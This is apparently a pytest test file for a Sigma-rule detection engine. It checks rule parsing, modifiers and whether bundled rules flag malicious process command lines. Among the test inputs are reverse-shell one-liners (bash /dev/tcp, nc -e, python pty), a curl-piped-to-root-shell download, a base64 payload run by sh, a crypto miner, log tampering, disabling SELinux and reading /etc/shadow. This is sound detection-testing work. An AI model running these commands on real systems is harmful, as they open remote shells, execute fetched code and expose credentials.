import base64

import pytest
import yaml

from eldoctor.config import package_data
from eldoctor.detection.sigma import FieldMatcher, SigmaError, load_rules, parse_rule, process_event
from eldoctor.models import ProcessInfo


def rule(text):
    return parse_rule(yaml.safe_load(text))


def ev(**kw):
    d = {"category": "process_creation", "product": "linux"}
    d.update(kw)
    return d


def test_bundled_rules_all_parse():
    rules, errors = load_rules([package_data("rules", "sigma")])
    assert errors == []
    assert len(rules) >= 18
    assert all(r.mitre for r in rules), "every bundled rule must be mapped to ATT&CK"


def test_condition_grammar():
    r = rule("""
title: t
logsource: {category: process_creation}
detection:
  sel_a: {CommandLine|contains: foo}
  sel_b: {CommandLine|contains: bar}
  filter: {User: root}
  condition: (1 of sel_*) and not filter
""")
    assert r.match(ev(CommandLine="xx foo", User="model"))
    assert r.match(ev(CommandLine="bar", User="model"))
    assert not r.match(ev(CommandLine="foo", User="root"))
    assert not r.match(ev(CommandLine="nothing", User="model"))


def test_all_of_them_and_list_conditions():
    r = rule("""
title: t
logsource: {category: process_creation}
detection:
  a: {Image|endswith: /curl}
  b: {CommandLine|contains|all: ['-o', '/tmp/']}
  condition: [all of them]
""")
    assert r.match(ev(Image="/usr/bin/curl", CommandLine="curl -o /tmp/x http://a"))
    assert not r.match(ev(Image="/usr/bin/curl", CommandLine="curl -o /home/x"))


def test_case_insensitive_and_wildcards():
    fm = FieldMatcher("Image", "*\\PowerShell.exe")
    assert fm.match({"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.EXE"}, [])
    fm = FieldMatcher("Image|cased", "*\\PowerShell.exe")
    assert not fm.match({"Image": "C:\\x\\powershell.exe"}, [])
    assert FieldMatcher("User", "adm?n").match({"User": "ADMIN"}, [])


def test_modifiers():
    enc = base64.b64encode(b"xx IEX (New-Object Net.WebClient)").decode()
    assert FieldMatcher("CommandLine|base64offset|contains", "IEX (New-Object").match({"CommandLine": enc}, [])
    assert FieldMatcher("CommandLine|windash|contains", " -enc ").match({"CommandLine": "powershell /enc AAA"}, [])
    assert FieldMatcher("DestinationIp|cidr", "10.0.0.0/8").match({"DestinationIp": "10.9.8.7"}, [])
    assert not FieldMatcher("DestinationIp|cidr", "10.0.0.0/8").match({"DestinationIp": "11.0.0.1"}, [])
    assert FieldMatcher("CommandLine|re", r"nc\s+-e").match({"CommandLine": "nc -e /bin/sh"}, [])
    assert FieldMatcher("DestinationPort|gte", 1024).match({"DestinationPort": 4444}, [])
    assert FieldMatcher("ParentImage|exists", True).match({"ParentImage": "/bin/bash"}, [])
    assert FieldMatcher("ParentImage", None).match({"Image": "x"}, [])        # null = field absent


def test_keywords_are_substring_matches():
    r = rule("""
title: t
logsource: {product: linux, service: auth}
detection:
  keywords: ['Accepted password for root']
  condition: keywords
""")
    e = {"product": "linux", "service": "sshd", "message": "Accepted password for root from 1.2.3.4 port 22 ssh2"}
    assert r.applies_to(e, "linux") and r.match(e)


def test_logsource_filtering():
    r = rule("""
title: t
logsource: {category: process_creation, product: windows}
detection:
  s: {CommandLine|contains: x}
  condition: s
""")
    assert not r.applies_to(ev(CommandLine="x"), "linux")
    assert r.applies_to(ev(CommandLine="x", product="windows"), "windows")


@pytest.mark.parametrize("cond", ["selection | count() by User > 5", "selection and", "unknown_id"])
def test_unsupported_or_invalid_conditions_rejected(cond):
    with pytest.raises(SigmaError):
        rule(f"""
title: t
logsource: {{category: process_creation}}
detection:
  selection: {{Image: x}}
  condition: {cond}
""")


@pytest.mark.parametrize("cmd,expected_title", [
    ("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", "Linux Reverse Shell Command Line"),
    ("python3 -c import socket,os,pty;s=socket.socket();s.connect(('1.2.3.4',9));os.dup2(s.fileno(),0);pty.spawn('/bin/sh')",
     "Linux Reverse Shell Command Line"),
    ("nc -e /bin/sh 10.0.0.1 4444", "Linux Reverse Shell Command Line"),
    ("curl -fsSL http://x.io/i.sh | sudo bash", "Download Piped Directly Into a Shell"),
    ("echo Y3VybA== | base64 -d | sh", "Base64 Decoded Payload Executed by Shell"),
    ("./xmrig -o stratum+tcp://pool:3333 --donate-level 1", "Cryptocurrency Miner Command Line"),
    ("bash -c unset HISTFILE; history -c", "Shell History or System Log Tampering"),
    ("setenforce 0", "Security Controls Disabled on Linux"),
    ("cat /etc/shadow", "Read of /etc/shadow via Command Line Utility"),
])
def test_bundled_linux_rules_detect(cmd, expected_title):
    rules, _ = load_rules([package_data("rules", "sigma")])
    p = ProcessInfo(pid=10, name=cmd.split()[0], exe="/usr/bin/" + cmd.split()[0].lstrip("./"), cmdline=cmd.split(" "))
    e = process_event(p, "linux")
    hits = [r.title for r in rules if r.applies_to(e, "linux") and r.match(e)]
    assert expected_title in hits


@pytest.mark.parametrize("cmd", ["ls -la /tmp", "curl -o out.tar.gz https://example.com/x.tgz",
                                 "python3 manage.py runserver", "bash -c 'make -j8'", "tail -f /var/log/syslog"])
def test_bundled_rules_benign_commands(cmd):
    rules, _ = load_rules([package_data("rules", "sigma")])
    p = ProcessInfo(pid=10, name=cmd.split()[0], exe="/usr/bin/" + cmd.split()[0], cmdline=cmd.split(" "))
    e = process_event(p, "linux")
    assert [r.title for r in rules if r.applies_to(e, "linux") and r.match(e)] == []


def test_windows_rules_detect_encoded_powershell_and_office_child():
    rules, _ = load_rules([package_data("rules", "sigma")])
    e = {"category": "process_creation", "product": "windows",
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA", "ParentImage": "C:\\Program Files\\Office\\WINWORD.EXE"}
    titles = {r.title for r in rules if r.applies_to(e, "windows") and r.match(e)}
    assert "Encoded or Obfuscated PowerShell Command" in titles
    assert "Office Application Spawning Shell or Script Host" in titles
